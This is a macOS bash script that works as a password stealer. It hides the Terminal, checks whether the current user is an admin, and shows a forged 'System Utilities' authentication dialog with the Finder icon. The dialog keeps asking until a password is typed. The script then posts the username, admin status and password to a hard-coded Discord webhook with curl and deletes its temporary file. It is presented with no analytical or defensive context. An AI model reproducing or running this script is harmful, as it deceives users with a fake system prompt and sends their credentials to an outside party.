#!/bin/bash

# Ensure Terminal is hidden initially
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# AppleScript for password prompt
read -r -d '' applescriptCode <<'EOF'
set msg1 to "MacOS is trying to authenticate user.\n\nEnter the password for the user "
set username to long user name of (system info)
set msg2 to " to allow this."
try
    set dialogText to text returned of (display dialog "" & msg1 & username & msg2 with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    return dialogText
on error
    return "CANCEL"
end try
EOF

# Check if user is admin
if dscl . -read /Groups/admin GroupMembership | awk '{print $2, $3, $4, $5, $6, $7, $8, $9}' | grep -q "$username"; then
    isadmin="(user is admin)"
else
    isadmin="(user is not admin)"
fi

# Initialize capture
capture=$(echo -e username="$username" + "$isadmin" \\n\\r_________________________________________________________________________________________\\n\\r\\n\\r)

# Show Terminal for countdown
osascript -e 'tell app "Terminal" to set visible of front window to true'

# 10-second countdown
echo "Enter password in the prompt within 10 seconds..."
for ((i=10; i>=1; i--)); do
    echo "$i seconds remaining..."
    sleep 1
done

# Hide Terminal again
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Check if dialog is still open (simulated by checking if pass.txt exists yet)
dialogText=""
while true; do
    dialogText=$(osascript -e "$applescriptCode")
    if [[ "$dialogText" != "CANCEL" ]]; then
        capture="$capture$(echo -e password = "$dialogText" \\n\\r)"
        break
    fi
done

# Save to pass.txt
echo "$capture" > pass.txt

# Check if pass.txt exists and send to Discord
if [[ -f pass.txt ]]; then
    curl -H "Content-Type: application/json" -d "{\"content\":\"$(cat pass.txt | sed 's/"/\\"/g')\"}" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
